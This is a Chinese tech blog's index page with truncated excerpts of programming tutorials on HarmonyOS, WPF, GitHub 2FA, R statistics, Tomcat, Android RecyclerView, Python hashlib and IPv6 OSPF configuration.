开源版根据 GNU Lesser General Public License (LGPL) 和 GNU General Public License (GPL) 发布。这意味着用户可以免费使用 Qt，但必须遵守特定的开源许可条款
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c473d6adcaa2f482fa5625df9aedecd8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/33d12e2a78bf5a2de2527430ddfa1295/" rel="bookmark">
			鸿蒙（HarmonyOS）项目方舟框架（ArkUI）之Swiper容器组件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		鸿蒙（HarmonyOS）项目方舟框架（ArkUI）之Swiper容器组件
一、操作环境 操作系统: Windows 10 专业版、IDE:DevEco Studio 3.1、SDK:HarmonyOS 3.1
二、Swiper容器组件 滑块视图容器，提供子组件滑动轮播显示的能力。
子组件 可以包含子组件。
接口 Swiper(controller?: SwiperController)
参数 参数名
参数类型
必填
参数描述
controller
SwiperController
否
给组件绑定一个控制器，用来控制组件翻页。
属性 除支持通用属性外，还支持以下属性：
名称
参数类型
描述
index
number
设置当前在容器中显示的子组件的索引值。
默认值：0
说明：
设置小于0或大于等于子组件数量时，按照默认值0处理。
autoPlay
boolean
子组件是否自动播放。
默认值：false
说明：
loop为false时，自动轮播到最后一页时停止轮播。手势切换后不是最后一页时继续播放。
interval
number
使用自动播放时播放的时间间隔，单位为毫秒。
默认值：3000
indicator
boolean
是否启用导航点指示器。
默认值：true
loop
boolean
是否开启循环。
设置为true时表示开启循环，在LazyForEach懒循环加载模式下，加载的组件数量建议大于5个。
默认值：true
duration
number
子组件切换的动画时长，单位为毫秒。
默认值：400
vertical
boolean
是否为纵向滑动。
默认值：false
itemSpace
number | string
设置子组件与子组件之间间隙。
默认值：0
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/33d12e2a78bf5a2de2527430ddfa1295/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b06918be05a7b3891ab4b7cf1b28e512/" rel="bookmark">
			WPF自定义圆形百分比进度条
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		先看效果图
1.界面代码
&lt;UserControl x:Class="LensAgingTest.CycleProcessBar1" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:d="http://schemas.microsoft.com/expression/blend/2008" xmlns:local="clr-namespace:LensAgingTest" mc:Ignorable="d" d:DesignHeight="450" d:DesignWidth="800"&gt; &lt;Grid&gt; &lt;Viewbox&gt; &lt;Grid Width="34" Height="34"&gt; &lt;Path Name="myCycleProcessBar" Data="M17,3 A14,14 0 1 0 17.001,3 " Stroke="LightGray" StrokeThickness="3" Height="34" Width="34" VerticalAlignment="Center" HorizontalAlignment="Center"/&gt; &lt;Path Name="myCycleProcessBar1" Data="M17,3 A14,14 0 0 1 16,3 " Stroke="Green" StrokeThickness="3" Height="34" Width="34" VerticalAlignment="Center" HorizontalAlignment="Center"&gt; &lt;/Path&gt; &lt;Label Name="lbValue" Content="50%" HorizontalAlignment="Center" VerticalAlignment="Center" FontSize="9" /&gt; &lt;/Grid&gt; &lt;/Viewbox&gt; &lt;/Grid&gt; &lt;/UserControl&gt; 2.后台代码
using System; using System.Collections.Generic; using System.Linq; using System.Text; using System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b06918be05a7b3891ab4b7cf1b28e512/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5df890161e9cfc898774644694228bf6/" rel="bookmark">
			Github配置2FA认证
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Github配置2FA认证 Github官方声明：从 2023 年 3 月开始到 2023 年底，GitHub 将逐渐开始要求在 GitHub.com 上贡献代码的所有用户启用一种或多种形式的双因素身份验证 (2FA)。 如果你在符合条件的组中，当选择该组进行注册时，将收到一封通知电子邮件，该电子邮件标志着 45 天的 2FA 注册期的开始，并且你会看到要求你在 GitHub.com 上注册 2FA 的横幅。 如果未收到通知，则表示你不是需要启用 2FA 的组的成员，但我们强烈建议启用 2FA。
1 2FA原理 1.1 硬件型：U盾等 像在 App Store 上购买 App 时需要指纹，或者网银转账时需要用到的 U 盾，只有通过那只随身携带在身上的硬件才能通过验证，这些都属于硬件型的 2FA 。
1.2 软件型：一次性密码 而今天要讲的 OTP(One Time Password) 就是软件型的 2FA 。像大部分 APP 在风险操作时都会要求你输入验证码、或者当你要从新电脑登陆时，也需要到手机查看验证码，当然这些都是免费的。
因为这些验证码每次都不一样，且会在短时间内过期失效(一般的都是 10-30 分钟)，所以我们把它称为一次性的密码，每次都不一样自然安全性也比较高。 2 配置 2.1 进入配置页面 如果Github要求账户必须开启2FA，那么在我们登录成功后就会出现如下页面。
我们可以通过这里直接点击：Enable 2FA，进入2FA配置页面或者登录 GitHub，点击右上方头像，在下拉列表中选择 Settings 进入设置页面。在该页面左侧点击 Password and authentication 选项卡，可以看到一个 Two-factor authentication 设置项，点击“Enable two-factor authentication”按钮进入 2FA 配置页面。 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5df890161e9cfc898774644694228bf6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/57889c64cc1011decb25d215866efb30/" rel="bookmark">
			统计学-R语言-8.3
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言例题例题一例题二例题三例题四例题五例题六例题七 总结 前言 本篇介绍的是有关方差知识的题目介绍。
例题 例题一 （数据：exercise7_3.RData）为研究上市公司对其股价波动的关注程度，一家研究机构对在主板、中小板和创业板上市的190家公司进行了调查，得到如下数据：检验上市公司的类型对股价波动的关注程度是否独立。（α=0.05）
解：提出假设：
H0: 上市公司的类型对股价波动的关注程度是独立的
H1：上市公司的类型对股价波动的关注程度是不独立的
计算期望频数与检验统计量
x&lt;-c(50,70,30,15,20,5) M&lt;-matrix(x,nr=3,nc=2,byrow=TRUE,dimnames=list(c("主板企业","中小板企业","创业板企业"),c("关注","不关注"))) chisq.test(M) 在该项检验中，X2=16.854，P=0.0002189。由于P&lt;0.05，拒绝H0，认为上市公司的类型对股价波动的关注程度不独立，是有关的。
例题二 数据：exercise7_3.RData）为研究上市公司对其股价波动的关注程度，一家研究机构对在主板、中小板和创业板上市的190家公司进行了调查，得到如下数据：计算上市公司的类型与对股价波动的关注程度两个变量之间的 系数、Cramer’sV系数和列联系数，并分析其相关程度。
library(vcd) x&lt;-c(50,70,30,15,20,5) M&lt;-matrix(x,nr=3,nc=2,byrow=TRUE,dimnames=list(c("主板企业","中小板企业","创业板企业"),c("关注","不关注"))) assocstats(M) 由于系数只用于2*2列联表的相关性度量，所以R输出结果为NA。Cramer’sV系数和列联系数均显示上市公司的类型与对股价波动的关注程度之间存在一定的相关性。
例题三 数据：exercise7_4.RData）一家汽车企业的销售部门对北部地区、中部地区和南部地区的400个消费者做了抽样调查，得到如下数据：
(1)利用公式求出期望频数以及 统计量(写明步骤)，将结果填入上表括号内。
(2)检验地区与汽车价格是否独立( )（利用R代码进行列联表独立性检验）。
解：提出假设：
H0: 地区与汽车价格是独立的
H1：地区与汽车价格是不独立的
计算期望频数与检验统计量
解：
x&lt;-c(20,40,40,50,50,60,30,20,20,40,10,20) M&lt;-matrix(x,nr=4,nc=3,byrow=TRUE,dimnames=list(c("10万元以下","10万元~20万元","20万元~30万元","30万元以上"),c("北部地区","南部地区","中部地区"))) chisq.test(M) 在该项检验中，X2=29.991，P= 3.946e-05。由于P&lt;0.05，拒绝H0，认为地区和汽车价格不独立，是有关的。
例题四 （数据：exercise7_4.RData）一家汽车企业的销售部门对北部地区、中部地区和南部地区的400个消费者做了抽样调查，得到如下数据：
计算地区与汽车价格两个变量之间的系数、Cramer’sV系数和列联系数，并分析其相关程度。
解：
library(vcd) assocstats(M) 由于系数只用于22列联表的相关性度量，所以R输出结果为NA。Cramer’sV系数和列联系数均显示地区与汽车价格之间存在一定的相关性。
例题五 215名病人中的39名被观测到患有哮喘，青原博士希望对“ 随机病人” 患有哮喘的概率是 0.15这个假设做检验。使用两种方法
解：提出假设：设“ 随机病人” 患有哮喘的概率为p
H0: p=0.15
H1： p 0.15
在R里能用函数prop.test()来做检验：
&gt;prop.test(39,215,.15) #三个参数分别是成功观测数，总数以及相对其检验的概率参数 1-sample proportions test with continuity correction
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/57889c64cc1011decb25d215866efb30/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/17b491867f7259d9fe3f2117b7e435e0/" rel="bookmark">
			《动手学深度学习(PyTorch版)》笔记4.7
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Chapter4 Multilayer Perceptron 4.7 Forward/Backward Propagation and Computational Graphs 本节将通过一些基本的数学和计算图，深入探讨反向传播的细节。首先，我们将重点放在带权重衰减（ L 2 L_2 L2​正则化）的单隐藏层多层感知机上。
4.7.1 Forward Propagation 前向传播（forward propagation或forward pass）指的是按顺序（从输入层到输出层）计算和存储神经网络中每层的结果。
我们将一步步研究单隐藏层神经网络的机制，为了简单起见，我们假设输入样本是 x ∈ R d \mathbf{x}\in \mathbb{R}^d x∈Rd，并且我们的隐藏层不包括偏置项。这里的中间变量是：
z = W ( 1 ) x , \mathbf{z}= \mathbf{W}^{(1)} \mathbf{x}, z=W(1)x,
其中 W ( 1 ) ∈ R h × d \mathbf{W}^{(1)} \in \mathbb{R}^{h \times d} W(1)∈Rh×d是隐藏层的权重参数。将中间变量 z ∈ R h \mathbf{z}\in \mathbb{R}^h z∈Rh通过激活函数 ϕ \phi ϕ后，我们得到长度为 h h h的隐藏激活向量：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/17b491867f7259d9fe3f2117b7e435e0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2941008ec0b898d88eee6ea7712f1a06/" rel="bookmark">
			【Tomcat与网络1】史前时代—没有Spring该如何写Web服务
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在前面我们介绍了网络与Java相关的问题， 最近在调研的时候发现这块内容其实非常复杂，涉及的内容多而且零碎，想短时间梳理出整个体系是不太可能的，所以我们还是继续看Tomcat的问题，后面有网络的内容继续补充吧。
目录
1 搭建一个本地web服务
2 Java web是如何工作的
Servlet是Java Web的核心机制，而实现Servlet最好的服务器无疑就是Tomcat。在前面我们介绍了如何用Java实现网络通信，这个与自己实现一个Servlet服务器，比如Tomcat 还差多少呢？差十万八千里，有一个挺好玩的图：
目前各类Spring的材料实在太多了，我们用的也多。那么Spring到底是什么？又有什么用呢？我们可以找到一堆的标准答案，但是貌似对Spring的理解总是感觉没有学透，那么Spring的作用到底体现在哪里呢？要理解这个问题，我们需要先看一下没有Spring的世界是什么样的，然后再看看有了Spring之后是什么样子的，这样自然理解更加透彻。
史前时代
假如没有Spring框架，要开发一个java web程序该怎么做呢？很多人马上想到了Java web里的Servlet、JSP以及Tomcat这些技术，是的，这是用Java做web应用基础技术。接触Java 有些年头了，相信很多人已经忘记了怎么创建一个不使用构建工具和任何Java Web框架的原始JavaWeb。本节我们看一下如何搭建一个没有高级框架的web应用。这个工作使用idea还挺麻烦，我们记录一下：
1 搭建一个本地web服务 1.打开idea，选择file-&gt;New-&gt;Project
2.点击Java,点击下一步.
3.修改项目名
这里根据你的计划，设置到一个相对稳定的目录即可。为了防止异常问题，建立路径里不要有空格或者中文字符。
4.右键项目，选择add framework support
5.完成之后，项目结构变成了这样,然后我们在WEB-INF下创建classes和lib文件夹，如下所示：
6.接下来，编辑项目结构, 将output path的路径改成classes文件夹的路径，如下所示：
7.点击dependencies，选择加号，选择jars or directories, 点击后，他会弹出一个文件选择框，这里选择lib文件所在位置，如图所示：
然后此时单击西方的“+”号，会出现中间位置的弹窗，单击之后会在中间位置出现一个小窗口：
这里将web-INF下的lib目录添加进来。此时还会出现一个弹窗，就是询问这个lib是干什么的，这就是我们后面会手动添加的lib：
之后选中退出即可，效果如下：
接下来要配置tomcat，我们使用的是8.5。这个需要先下载到本地，然后执行一下看看是否正常。之后再在idea中配置。
单击idea的“Run”，然后选择“edit setting”，进入下面的界面：
此时我们要首先选择左上方的“+”，在列表中找到“tomcat server”（注意不要和TomEE server混了）。
然后配置右侧的相关内容。这里图中标记处默认的端口号是8080，但是8080经常会和其他服务冲突，因此这里改成了9091。
这里还要注意deployment下的这个配置：
保持与全面访问路径一致。
最后我们打开index.jsp页面，增加如下内容：
&lt;html&gt; &lt;head&gt; &lt;title&gt;Hello world&lt;/title&gt; &lt;/head&gt; &lt;body&gt; Hello world &lt;/body&gt; &lt;/html&gt; 之后启动tomcat，在浏览器输入：http://localhost:9091/webtest/就可以看到一个“Hello world"的信息。
2 Java web是如何工作的 有了上面的环境之后，那如何实现展示的内容与后台Java交互呢？我们知道有两种常用的技术，一种是JSP，一个是直接写Servlet。JSP其实就是在静态页面里嵌入Java代码，而Servlet则是在Java代码里嵌入静态代码，例如常见的JSP页面一般是这样的：
&lt;%@ page import="com.lqc.pojo.Person" %&gt; &lt;%@ page import="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2941008ec0b898d88eee6ea7712f1a06/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/569a5872dbf9e2c9a2b0668d29a79949/" rel="bookmark">
			C语言通过IXMLHttpRequest以get或post方式发送http请求获取服务器文本或xml数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		做过网页设计的人应该都知道ajax。
Ajax即Asynchronous Javascript And XML（异步的JavaScript和XML）。使用Ajax的最大优点，就是能在不更新整个页面的前提下维护数据。这使得Web应用程序更为迅捷地回应用户动作，并避免了在网络上发送那些没有改变的信息。
在IE浏览器中，Ajax技术就是基于JavaScript里面的XMLHttpRequest。AJAX通过XMLHttpRequest对象发出HTTP 请求，得到服务器返回的数据后，再进行处理。现在，服务器返回的都是JSON格式的数据，XML格式已经过时了，但是AJAX这个名字已经成了一个通用名词，字面含义已经消失了。
XMLHttpRequest对象是AJAX的主要接口，用于浏览器与服务器之间的通信。尽管名字里面有XML和Http，它实际上可以使用多种协议（比如file或ftp），发送任何格式的数据（包括字符串和二进制）。
其实，不仅在网页上能用JavaScript语言调用XMLHttpRequest组件，在桌面窗口程序里面也可以用C语言或C++调用XMLHttpRequest组件。
XMLHttpRequest是微软msxml6.0里面的组件。msxml6.0可直接解析服务器返回的xml文档，但json数据需要在网上找cJSON库来解析。
第一节 准备Web服务器页面 首先我们要在自己的服务器上准备好处理ajax请求的页面，本文准备了三个示例页面：str_test.php、json_test.php和xml_test.php，分别用来产生文本回应、json回应和xml回应。xml_test.php页面支持get和post两种ajax请求方式。
PHP文件用UTF-8编码保存，但C文件要用GB2312编码保存。
这是因为在微软的简体中文Windows系统里面，以A结尾的API函数（如CreateWindowA）采用的是GB2312编码的char *字符串，以W结尾的API函数（如CreateWindowW）采用的是UTF-16编码的wchar_t *字符串，COM组件使用的BSTR字符串是在wchar_t *字符串的基础上增加了4字节的字符串长度前缀。
IXMLHttpRequest组件（一种COM组件）工作时使用的是UTF-16编码的BSTR字符串。
我们在收到IXMLHttpRequest组件提供的UTF-16编码的BSTR字符串后，如果想要用printf在控制台上打印出来，就需要用convert_bstr_to_string函数将BSTR转换为GB2312编码的char *字符串。想要直接打印BSTR字符串不能用printf函数，要用WriteConsoleW函数才行。如果是显示在窗口的文本框或者窗口的标题栏上那就简单了，直接用SetWindowTextW或SetDlgItemTextW函数，把BSTR字符串传进去就行了。
同样，在给IXMLHttpRequest组件传递字符串参数时，需要先用convert_string_to_bstr函数将GB2312编码的char *字符串转换为UTF-16编码的带长度前缀的BSTR字符串。
如果是写入txt文本文件的话，我们就可以采用UTF-8编码，用MultiByteToWideChar函数（CP_UTF8）将BSTR转换成UTF-8编码的char *字符串，再用fprintf或fwrite写入txt文件。
str_test.php：
&lt;?php header('Content-type: text/html; charset=utf-8'); ?&gt; 当前时间为&lt;?=date("Y年n月j日 H:i:s")?&gt;。 json_test.php：
&lt;?php header('Content-type: application/json'); header('Pragma: no-cache'); header('Cache-control: no-cache'); header('Expires: 0'); $arr = array(); $arr["date"] = date("Y-n-j H:i:s"); $arr["time"] = time(); $arr["desc"] = "abcd简体中文"; echo json_encode($arr); ?&gt; xml_test.php：
&lt;?php header('Content-type: text/xml'); session_start(); header('Pragma: no-cache'); header('Cache-control: no-cache'); header('Expires: 0'); echo '&lt;?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/569a5872dbf9e2c9a2b0668d29a79949/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2f12b111c154499b6955f5bd94738223/" rel="bookmark">
			统计学-R语言-8.2
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言双因子方差分析数学模型主效应分析交互效应分析正态性检验 绘制3个品种产量数据合并后的正态Q-Q图（数据：example8_2）练习 前言 本篇将继续介绍方差分析的知识。
双因子方差分析 考虑两个类别自变量对数值因变量影响的方差分析称为双因子方差分析（two-way analysis of variance）（分析两个因子(因子A和因子B)对实验结果的影响） 分析时有两种情形：
只考虑两个因子对因变量的单独影响，即主效应（main effect）（如果两个因子对实验结果的影响是相互独立的，分别判断因子A和因子B对实验数据的单独影响），这时的双因子方差分析称为只考虑主效应的双因子方差分析或无重复双因子方差分析(Two-factor without replication)
除了两个因子的主效应外，还考虑两个因子的搭配对因变量产生的交互效应（interaction effect）（如果除了因子A和因子B对实验数据的单独影响外，两个因子的搭配还会对结果产生一种新的影响），这时的双因子方差分析称为考虑交互效应的双因子方差分析或可重复双因子方差分析 (Two-factor with replication)
数学模型 如果只考虑主效应而不考虑交互效应，两个因子的每种组合可以只测得一个观察值，即K=1。但要考虑交互效应时，每种组合就必须重复测量多个观察值，一般要求每种处理的重复次数K不小于2。
为便于表述，我们引进下列记号：
就是只考虑主效应时双因子方差分析的数学模型，显然它是考虑交互效应的方差分析模型的一个特例。
主效应分析 效应检验：
提出假设
对于因子A的I个处理和因子B的J个处理，要检验因子A和因子B对因变量的影响效应，也就是检验下面的假设：
检验因子A的假设：
𝐻_0:𝛼_𝑖=0（𝑖=1,2,⋯,𝐼）（因子A的处理效应不显著）
𝐻_1:𝛼_𝑖至少有一个不等于0 （因子A的处理效应显著）
检验因子B的假设：
𝐻_0:𝛽_𝑗=0（𝑗=1,2,⋯,𝐽）（因子B的处理效应不显著）
𝐻_1:𝛽_𝑗至少有一个不等于0 （因子B的处理效应显著）
各因子的效应用误差来表示。检验上述假设时，与线性模型对应的误差分解过程如下图所示：
将各平方和（SS）除以相应的自由度df，得到各均方（MS），再将各处理均方（MSA和MSB）分别除以误差均方（MSE），即得到用于检验因子A和因子B主效应的统计量FA和FB。只考虑主效应的双因子方差分析表如下表所示：
如果两个因子的每种处理组合只测得一个观察值，即k=1，则误差平方和SSE的自由度为：df=IJ-I-J+1=（I-1)(J-1）。
总平方和SST的自由度为IJ-1。
例题：
(数据：example8_5.Rdata)假定在例8-1中，除了考虑品种对产量的影响外，还考虑施肥方式对产量的影响。假定有甲、乙两种施肥方式，这样3个小麦品种和两种施肥方式的搭配共有3×2=6种组合。如果选择30个地块进行实验，每一种搭配可以做5次实验，也就是每个品种（处理）的样本量为5，即相当于每个品种（处理）重复做了5次实验。实验取得的数据如下表所示。检验小麦品种和施肥方式对产量的影响是否显著(a=0.05）
解：设品种（因子A）对产量的附加效应分别为α1（品种1）、α2（品种2）和α3(品种3)；施肥方式（因子B）对产量的附加效应分别为β1（施肥方式甲）、β2（施肥方式乙）。
检验品种效应的假设为：
H0：α1=α2=α3=0（品种对产量的影响不显著）
H1：α1，α2，α3至少有一个不等于0（品种对产量的影响显著）
检验施肥方式效应的假设为：
H0：β1=β2=0（施肥方式对产量的影响不显著）
H1：β1，β2至少有一个不等于0（施肥方式对产量的影响显著）
首先，绘制按不同品种和不同施肥方式分组的箱线图，并计算按品种和施肥方式交叉分类的均值和标准差，描述品种和施肥方式对产量的影响。R代码和结果如下所示：
# 加载数据，将表8-4的短格式数据(table8_4)转为长格式数据,并另存为example8_5 table8_4&lt;-read.csv("c:/example/ch8/table8_4.csv") table8_4&lt;-cbind(table8_4,id=c(factor(1:10))) table8_4 library(reshape) example8_5&lt;-melt(table8_4,id.vars=c("id","施肥方式")) example8_5&lt;-rename(example8_5,c(variable="品种",value="产量")) save(example8_5,file="C:/example/ch8/example8_5.RData") load("C:/example/ch8/example8_5.RData") example8_5 # 绘制品种和施肥方式的箱线图 attach(example8_5) boxplot(产量~品种+施肥方式,col=c("gold","green","red"),ylab="产量",xlab="品种与施肥方式",data=example8_5) # 按品种和施肥方式交叉分类计算均值和标准差 library(reshape) library(agricolae) mystats&lt;-function(x)(c(n=length(x),mean=mean(x),sd=sd(x))) dfm&lt;-melt(example8_5,measure.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2f12b111c154499b6955f5bd94738223/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f312a453bd4f27689a8b9c2faf0366e4/" rel="bookmark">
			Android 基础技术——RecyclerView
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		笔者希望做一个系列，整理 Android 基础技术，本章是关于 RecyclerView
RecyclerView 对比 ListView 的优点 Adapter 面向的是 ViewHolder 不是 View, 可以省略 convertView.setTag 和 getTag 这些步骤可以设置布局管理器：竖向、横向、瀑布流方式可以设置 Item 的间隔样式Recycleview去掉了一些api，比如setEmptyview，onItemClickListener等等，给到用户更多的自定义可能Recycleview去掉了设置头部底部item的功能，专向通过viewholder的不同type实现Recycleview实现了一些局部刷新，比如notifyitemchangedRecycleview自带了一些布局变化的动画效果，也可以通过自定义ItemAnimator类实现自定义动画效果Recycleview缓存机制更全面，增加两级缓存，还支持自定义缓存逻辑 RecyclerView 一共有几级缓存 mAttachedScrap(屏幕内)，mCacheViews(屏幕外)，mViewCacheExtension(自定义缓存)，mRecyclerPool(缓存池)
mAttachedScrap(屏幕内)，用于屏幕内itemview快速重用，不需要重新createView和bindViewmCacheViews(屏幕外)，保存最近移出屏幕的ViewHolder，包含数据和 position 信息，复用时必须是相同位置的 ViewHolder 才能复用，应用场景在那些需要来回滑动的列表中，当往回滑动时，能直接复用ViewHolder数据，不需要重新bindView。mViewCacheExtension(自定义缓存)，不直接使用，需要用户自定义实现，默认不实现。mRecyclerPool(缓存池)，当cacheView满了后或者adapter被更换，将cacheView中移出的ViewHolder放到Pool中，放之前会把ViewHolder数据清除掉，所以复用时需要重新bindView。 RecyclerView 的缓存流程是怎样的 保存缓存流程： 插入或是删除itemView时，先把屏幕内的ViewHolder保存至AttachedScrap中滑动屏幕的时候，先消失的itemview会保存到CacheView，CacheView大小默认是2，超过数量的话按照先入先出原则，移出头部的itemview保存到RecyclerPool缓存池（如果有自定义缓存就会保存到自定义缓存里），RecyclerPool缓存池会按照itemview的itemtype进行保存，每个itemType缓存个数为5个，超过就会被回收。获取缓存流程： AttachedScrap中获取，通过pos匹配holder——&gt;获取失败，从CacheView中获取，也是通过pos获取holder缓存 ——&gt;获取失败，从自定义缓存中获取缓存——&gt;获取失败，从mRecyclerPool中获取 ——&gt;获取失败，重新创建viewholder——createViewHolder并bindview。 说下做过的RecyclerView 性能优化 bindViewHolder方法是在UI线程进行的，此方法不能耗时操作，不然将会影响滑动流畅性。比如进行日期的格式化。对于新增或删除的时候，可以使用diffutil进行局部刷新，少用全局刷新对于itemVIew进行布局优化，比如少嵌套等。加大RecyclerView缓存，比如cacheview大小默认为2，可以设置大点，用空间来换取时间，提高流畅度如果高度固定，可以设置setHasFixedSize(true)来避免requestLayout浪费资源，否则每次更新数据都会重新测量高度。如果多个RecycledView 的 Adapter 是一样的，比如嵌套的 RecyclerView 中存在一样的 Adapter，可以通过设置 RecyclerView.setRecycledViewPool(pool) 来共用一个 RecycledViewPool。这样就减少了创建VIewholder的开销。在RecyclerView的元素比较高，一屏只能显示一个元素的时候，第一次滑动到第二个元素会卡顿。这种情况就可以通过设置额外的缓存空间，重写getExtraLayoutSpace方法即可。设置RecyclerView.addOnScrollListener() 来在滑动过程中停止加载的操作。减少对象的创建，比如设置监听事件，可以全局创建一个，所有view公用一个listener，并且放到CreateView里面去创建监听，因为CreateView调用要少于bindview。这样就减少了对象创建所造成的消耗用notifyDataSetChange时，适配器不知道整个数据集中的那些内容以及存在，再重新匹配ViewHolder时会花生闪烁。设置adapter.setHasStableIds(true)，并重写getItemId()来给每个Item一个唯一的ID，也就是唯一标识，就使itemview的焦点固定，解决了闪烁问题。 RecyclerView 为什么可以做到局部刷新 RecyclerView的局部刷新就是依赖Scrap的临时缓存，当我们通过notifyItemRemoved()，notifyItemChanged()通知item发生变化的时候，通过mAttachedScrap缓存没有发生变化的ViewHolder，其他的则由mChangedScrap缓存，添加itemView的时候快速从里面取出，完成局部刷新。
注意，如果我们使用notifyDataSetChanged()来通知RecyclerView刷新，屏幕上的itemView被标记为FLAG_INVALID并且未被移除，所以不会使用Scrap缓存，而是直接扔到CacheView或者RecycledViewPool池中，回来的时候重新走一次绑定数据。
注意：itemE并没有出现在屏幕中，它不属于Scrap管辖的范围，Scrap只会缓存在屏幕中已经加载出来的itemView的holder。
RecycerView 如何缓存不同的itemType的ViewHolder public static class RecycledViewPool { private static final int DEFAULT_MAX_SCRAP = 5; static class ScrapData { final ArrayList&lt;ViewHolder&gt; mScrapHeap = new ArrayList&lt;&gt;(); int mMaxScrap = DEFAULT_MAX_SCRAP; } SparseArray&lt;ScrapData&gt; mScrap = new SparseArray&lt;&gt;(); } 可以看出，RecycledViewPool中定义了SparseArray&lt;ScrapData&gt; mScrap，它是一个根据不同itemType来保存静态类ScrapData对象的SparseArray，ScrapData中包含了ArrayList&lt;ViewHolder&gt; mScrapHeap ，mScrapHeap是保存该itemType类型下ViewHolder的ArrayList。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f312a453bd4f27689a8b9c2faf0366e4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/633e6648a9b04c54ff448f827fac3010/" rel="bookmark">
			Python的hashlib模块：7种加密算法深入剖析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、引言
二、哈希算法简介
三、hashlib模块中的加密算法
MD5
SHA1
SHA224/SHA256/SHA384/SHA512
SHA3
其他算法：
四、加密算法比较与选择
五、实际应用与注意事项
六、总结
本文将深入探讨Python的hashlib模块，重点解析其中的七种加密算法：MD5、SHA1、SHA224、SHA256、SHA384、SHA512和SHA3。我们将通过理论、代码示例和实际应用来展示这些算法的特点和用途。
一、引言 在信息安全领域，哈希函数是一种将任意长度的数据映射为固定长度输出的加密算法。Python的hashlib模块提供了多种哈希算法，广泛应用于数据完整性验证、密码存储等领域。
二、哈希算法简介 MD5（Message Digest Algorithm 5）：广泛用于数据完整性验证，但已被证明存在安全隐患。
SHA（Secure Hash Algorithm）系列：包括SHA1、SHA224、SHA256、SHA384、SHA512和SHA3，安全性依次递增。
三、hashlib模块中的加密算法 MD5 描述：生成128位哈希值。
用途：尽管MD5的安全性已受到质疑，但仍广泛用于数据完整性验证。
示例代码：
import hashlib md5_hash = hashlib.md5() data = b"Hello, World!" md5_hash.update(data) digest = md5_hash.hexdigest()` SHA1 描述：生成160位哈希值。
用途：尽管安全性相对较高，但已逐渐被更安全的算法取代。
示例代码：
python`import hashlib sha1_hash = hashlib.sha1() data = b"Hello, World!" sha1_hash.update(data) digest = sha1_hash.hexdigest()`
SHA224/SHA256/SHA384/SHA512 描述：这些算法生成不同长度的哈希值，安全性依次递增。
用途：适用于各种安全需求，包括数据完整性验证和密码存储。
示例代码：以SHA256为例，其他算法类似。
import hashlib sha256_hash = hashlib.sha256() data = b"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/633e6648a9b04c54ff448f827fac3010/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6f07bdd83563aaf39f4004df44970b61/" rel="bookmark">
			OSPFv6配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		正文共：1024 字 11 图，预估阅读时间：1 分钟
在你学习完IPv6的静态路由配置之后（IPv6静态路由配置），基本上就算是IPv6的高手了。但是我们前面也提到了，IPv6静态路由是靠管理员手工配置的，适合于一些结构比较简单的IPv6网络，不能自动适应网络拓扑结构的变化。
既然静态路由有局限性，那就换成动态路由协议好了。
首先把底层网络配置好。
配置接口IPv6地址
接口的IPv6地址配置就使用上次的配置，具体如下：
VSR1
# interface GigabitEthernet2/0 ipv6 address 1::1/64 # interface GigabitEthernet3/0 ipv6 address 2::1/64 VSR2
